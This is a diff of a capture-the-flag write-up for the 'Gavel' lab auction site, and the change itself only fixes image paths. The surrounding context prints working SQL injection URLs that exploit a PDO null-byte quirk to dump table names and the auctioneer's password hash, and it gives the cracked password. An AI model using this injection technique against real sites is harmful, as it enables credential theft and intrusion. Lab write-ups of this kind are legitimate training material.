@@ -67,15 +67,15 @@ Browsing to `http://gavel.htb/` lands on a fantasy auction platform. The theme i
 - `/bidding.php`: live auctions with a countdown timer per item
 - `/admin.php`: admin panel, gated to the `auctioneer` role
 
-![Gavel auction platform homepage](/images/gavel/gavel-homepage.png)
+![Gavel auction platform homepage](images/gavel/gavel-homepage.png)
 
 Browsing further reveals a login page and a register page where new accounts get 50,000 coins to start bidding.
 
-![Gavel register page](/images/gavel/gavel-register.png)
+![Gavel register page](images/gavel/gavel-register.png)
 
 I register an account and poke around. The bidding page shows one or more active auctions with a current price, time remaining, and a bid field. The admin panel redirects me back to the index when I try to access it. The inventory page has a "Sort by" dropdown with two options: Name and Quantity.
 
-![Your inventory page](/images/gavel/gavel-inventory.png)
+![Your inventory page](images/gavel/gavel-inventory.png)
 
 ### Directory Fuzzing
 
@@ -318,7 +318,7 @@ The response renders the `VERSION()` output as an item name in the inventory pag
 http://gavel.htb/inventory.php?sort=\?;--+-%00&user_id=x`+FROM+(SELECT+VERSION()+AS+`%27x`)y;--+-
 ```
 
-![VERSION() output rendered in inventory](/images/gavel/gavel-basic-poc.png)
+![VERSION() output rendered in inventory](images/gavel/gavel-basic-poc.png)
 
 sqlmap will not find this because its payloads never contain `\?` followed by a null byte inside a backtick-wrapped string. This technique was documented by Searchlight Cyber as a novel PDO interaction.
 
@@ -334,7 +334,7 @@ http://gavel.htb/inventory.php?sort=\?;--+-%00&user_id=x`+FROM+(SELECT+GROUP_CON
 
 Response shows tables: `auctions,inventory,items,users`
 
-![Table list from information_schema](/images/gavel/gavel-sqli-version.png)
+![Table list from information_schema](images/gavel/gavel-sqli-version.png)
 
 Get columns from `users`:
 
@@ -346,7 +346,7 @@ http://gavel.htb/inventory.php?sort=\?;--+-%00&user_id=x`+FROM+(SELECT+GROUP_CON
 
 Response: `id,username,password,role,created_at,money`
 
-![Columns from users table](/images/gavel/gavel-sqli-columns.png)
+![Columns from users table](images/gavel/gavel-sqli-columns.png)
 
 Extract the auctioneer credential:
 
@@ -360,7 +360,7 @@ The inventory page renders:
 auctioneer:$2y$10$<hash>
 ```
 
-![Credential dump from users table](/images/gavel/gavel-sqli-creds.png)
+![Credential dump from users table](images/gavel/gavel-sqli-creds.png)
 
 ### Hash Cracking
 
@@ -380,11 +380,11 @@ Cracks in a few minutes.
 
 I log in as `auctioneer` / `midnight1`. The sidebar now shows "Admin Panel". Navigating to `/bidding.php` shows the live auctions as the auctioneer.
 
-![Live auction page as auctioneer](/images/gavel/gavel-bidding.png)
+![Live auction page as auctioneer](images/gavel/gavel-bidding.png)
 
 On `/admin.php`, there are auction cards, each with a rule input field and a message input field.
 
-![Admin panel rule field](/images/gavel/gavel-admin.png)
+![Admin panel rule field](images/gavel/gavel-admin.png)
 
 From the source code review, `bid_handler.php` loads the rule associated with the auction as a PHP function and runs it against the bid:
 
